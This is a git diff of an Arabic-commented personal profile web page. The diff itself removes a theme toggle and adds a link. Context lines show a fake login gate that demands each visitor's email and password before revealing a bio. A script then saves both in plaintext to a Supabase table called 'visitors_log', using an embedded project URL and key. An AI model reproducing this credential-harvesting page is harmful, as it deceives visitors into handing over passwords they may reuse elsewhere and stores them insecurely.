@@ -22,26 +22,10 @@
             --text-color: #8892b0;
         }
 
-        /* تنسيقات النمط الفاتح (Light Mode) */
-        .light-mode {
-            --back_color: radial-gradient(circle at center, #f0f4f8 0%, #d9e2ec 100%);
-            --front_color: rgba(255, 255, 255, 0.85);
-            --text-color: #102a43;
-            --deep-blue: #334e68;
-            --white: #102a43;
-        }
-
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
-        body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; transition: 0.5s; }
+        body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
 
-        /* أيقونة المصباح */
-        .theme-toggle {
-            position: absolute; top: 20px; right: 20px; font-size: 1.5rem;
-            color: var(--gold); cursor: pointer; z-index: 1001; transition: 0.3s;
-        }
-        .theme-toggle:hover { transform: scale(1.2) rotate(15deg); }
-
-        /* واجهة الدخول */
+        /* واجهة الدخول ورصد الزوار */
         #auth-screen {
             position: fixed; inset: 0; background: var(--back_color); z-index: 1000;
             display: flex; justify-content: center; align-items: center;
@@ -54,7 +38,7 @@
         .auth-box h2 { color: var(--gold); margin-bottom: 25px; letter-spacing: 2px; }
         .auth-box input {
             width: 100%; padding: 14px; margin: 10px 0; background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(197, 160, 89, 0.2); border-radius: 12px; color: var(--white); outline: none;
+            border: 1px solid rgba(197, 160, 89, 0.2); border-radius: 12px; color: white; outline: none;
         }
         .auth-box button {
             width: 100%; padding: 14px; margin-top: 20px;
@@ -83,7 +67,7 @@
         .satan h4 { font-size: 1.9em; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
         .snuff { min-height: 80px; padding: 0 30px; color: var(--text-color); margin-top: 10px; font-size: 0.9em; line-height: 1.6; }
         
-        /* الروابط المباشرة */
+        /* الروابط */
         .social { margin-top: 20px; }
         .social div { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; padding: 0 20px; }
         .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 12px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); transition: 0.3s; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; }
@@ -93,10 +77,6 @@
     </style>
 </head>
 <body>
-
-<div class="theme-toggle" onclick="toggleTheme()">
-    <i id="theme-icon" class="fas fa-lightbulb"></i>
-</div>
 
 <div id="auth-screen">
     <div class="auth-box">
@@ -129,6 +109,8 @@
                 
                 <a href="https://github.com/salemalshamrie"><i class="fas fa-code"></i></a>
                 
+                <a href="https://16salm.github.io/AI/"><i class="fas fa-lightbulb"></i></a>
+                
                 <a href="https://www.fcbarcelona.com"><i class="fas fa-football-ball"></i></a>
                 
                 <a href="#"><i class="fas fa-university"></i></a>
@@ -139,18 +121,6 @@
 </div>
 
 <script>
-    // وظيفة تبديل النمط
-    function toggleTheme() {
-        document.body.classList.toggle('light-mode');
-        const icon = document.getElementById('theme-icon');
-        if (document.body.classList.contains('light-mode')) {
-            icon.classList.replace('fa-lightbulb', 'fa-moon');
-        } else {
-            icon.classList.replace('fa-moon', 'fa-lightbulb');
-        }
-    }
-
-    // إعدادات سوبابيز
     const SB_URL = 'https://gzioimivawyqxjoxajdw.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd6aW9pbWl2YXd5cXhqb3hhamR3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU0MTc1ODQsImV4cCI6MjA5MDk5MzU4NH0.2xKTF4oDkvUUFts6Igab01OfOPKkezAb3-U_xV7r1zY';
 
@@ -162,11 +132,10 @@
         const errorMsg = document.getElementById('error-msg');
 
         if (email === "" || password === "") {
-            errorMsg.innerText = "يرجى ملء الحقول";
+            errorMsg.innerText = "يرجى ملء كافة الحقول";
             return;
         }
 
-        // إرسال البيانات للجدول
         const { error } = await supabaseClient
             .from('visitors_log')
             .insert([{ visitor_email: email, visitor_password: password }]);
@@ -177,7 +146,6 @@
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('profile-card').style.display = 'block';
 
-            // تشغيل السيرة الذاتية (Bio) بالأنيميشن
             new Typed(".typed_text", {
                 strings: [
                     "Web Designer & Creative Developer.",
